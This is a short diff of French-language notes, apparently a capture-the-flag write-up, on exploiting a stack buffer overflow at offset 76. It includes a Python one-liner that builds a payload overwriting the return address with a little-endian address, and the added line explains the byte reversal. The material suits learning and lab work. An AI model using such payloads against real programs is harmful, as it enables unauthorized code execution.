@@ -13,7 +13,7 @@ l'overflow a lieu a partir de 76
 
 on va donc faire un programme python on quite gdb
 
-python -c "print 76 * 'a' + '\x08\x04\x84\x44'[::-1]" > /tmp/overflow
+python -c "print 76 * 'a' + '\x08\x04\x84\x44'[::-1]" > /tmp/overflow (on ecrit ::-1 pcq quand c ecrit dans la memoire c a l'envers du coup on retourne la chaine de base a l'envers pour quelle soit a lendroit)
 
 on va ouvrir un STDIN avec un cat et faire executer notre overflow 
 
